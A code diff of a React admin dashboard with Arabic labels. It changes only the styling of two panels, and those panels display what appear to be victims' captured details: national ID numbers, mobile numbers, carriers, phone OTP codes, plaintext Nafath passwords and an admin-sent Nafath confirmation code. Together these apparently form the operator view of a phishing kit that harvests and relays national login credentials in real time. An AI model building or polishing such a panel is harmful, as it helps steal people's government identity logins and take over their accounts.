@@ -1380,50 +1380,42 @@ export default function DashboardPage() {
 
     return (
       <div style={{ 
-        background: "#f9fafb", 
-        borderRadius: 8, 
-        padding: 8, 
-        border: "1px solid #d1d5db", 
-        fontFamily: "Cairo, Tajawal, sans-serif", 
+        background: "#ffffff", 
+        borderRadius: 12, 
+        padding: 16, 
+        border: "1px solid #e5e7eb", 
         marginBottom: 12,
         marginTop: 10,
         width: "40%",
         marginRight: 0,
         marginLeft: "auto"
       }}>
-        <div style={{ marginBottom: 8 }}>
-          <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
-            {(() => {
-              const dt = new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now());
-              const dateLabel = dt.toLocaleDateString("en-US", { month: "2-digit", day: "2-digit" }).replace(/\//g, "-");
-              const timeLabel = dt.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", hour12: true }).toLowerCase();
-              return `${dateLabel} | ${timeLabel}`;
-            })()}
-          </div>
-          <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>تحقق الهاتف</h3>
+        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>📱</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            تحقق الهاتف
+          </h3>
         </div>
 
         {hasPhoneData && (
-          <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
-            <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
-                <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الهوية:</span>
-                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneIdNumber || raw?.identityNumber || "—"}</span>
-              </div>
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
-                <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الجوال:</span>
-                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneNumber || raw?.mobileNumber || "—"}</span>
-              </div>
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
-                <span style={{ fontWeight: 600, color: "#6b7280" }}>شركة الاتصالات:</span>
-                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{raw?.phoneCarrier || "غير محدد"}</span>
-              </div>
+          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw?.phoneIdNumber || raw?.identityNumber || "—"}</span>
+            </div>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw?.phoneNumber || raw?.mobileNumber || "—"}</span>
+            </div>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>شركة الاتصالات</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw?.phoneCarrier || "غير محدد"}</span>
             </div>
           </div>
         )}
 
         {phoneOtpCode && (
-          <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 8 }}>
+          <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, marginBottom: 8, marginTop: 8 }}>
             <div style={{ marginBottom: 8 }}>
               <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
                 {(() => {
@@ -1501,41 +1493,38 @@ const renderNafadBox = () => {
 
     return (
       <div style={{ 
-        background: "#f9fafb", 
-        borderRadius: 8, 
-        padding: 8, 
-        border: "1px solid #d1d5db", 
-        fontFamily: "Cairo, Tajawal, sans-serif", 
+        background: "#ffffff", 
+        borderRadius: 12, 
+        padding: 16, 
+        border: "1px solid #e5e7eb", 
         marginBottom: 12,
         marginTop: 10,
         width: "40%",
         marginRight: 0,
         marginLeft: "auto"
       }}>
-        <div style={{ marginBottom: 8 }}>
-          <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
-            {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
-          </div>
-          <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>🇸🇦 نفاذ</h3>
+        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>🇸🇦</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            نفاذ
+          </h3>
         </div>
-        <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
-          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-            {raw?.nafadIdNumber && (
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
-                <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الهوية:</span>
-                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{raw.nafadIdNumber}</span>
-              </div>
-            )}
-            {raw?.nafadPassword && (
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
-                <span style={{ fontWeight: 600, color: "#6b7280" }}>كلمة المرور:</span>
-                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{String(raw.nafadPassword)}</span>
-              </div>
-            )}
-            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
-              <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم التأكيد المُرسل:</span>
-              <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{adminNafadCode || "00"}</span>
+        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+          {raw?.nafadIdNumber && (
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.nafadIdNumber}</span>
             </div>
+          )}
+          {raw?.nafadPassword && (
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>كلمة المرور</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{String(raw.nafadPassword)}</span>
+            </div>
+          )}
+          <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+            <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم التأكيد المُرسل</span>
+            <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{adminNafadCode || "00"}</span>
           </div>
         </div>
 
